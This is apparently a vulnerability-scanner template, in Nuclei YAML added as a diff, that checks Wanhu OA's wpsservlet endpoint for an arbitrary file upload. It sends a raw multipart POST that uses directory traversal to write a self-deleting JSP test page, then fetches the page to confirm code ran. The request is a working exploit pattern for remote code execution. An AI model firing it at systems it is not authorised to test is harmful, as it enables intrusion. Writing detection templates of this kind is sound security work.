@@ -1,0 +1,41 @@
+id: wanhu-wpsservlet-fileupload
+
+info:
+  name: 万户OA wpsservlet 任意文件上传
+  author: SleepingBag945
+  severity: critical
+
+
+
+variables:
+  filename: '{{rand_base(5)}}'
+  boundery: '{{rand_base(10)}}'
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/wpsservlet?option=saveNewFile&newdocId={{filename}}&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Cache-Control: max-age=0
+        Content-Type: multipart/form-data; boundary={{boundery}}
+
+        --{{boundery}}
+        Content-Disposition: form-data; name="NewFile"; filename="{{filename}}.jsp"
+
+        <% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        --{{boundery}}--
+
+      - |
+        GET /defaultroot/platform/portal/layout/{{filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+
+  
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200
+          - "status_code_2 == 200 && contains(body_2,'12321')"
+        condition: and
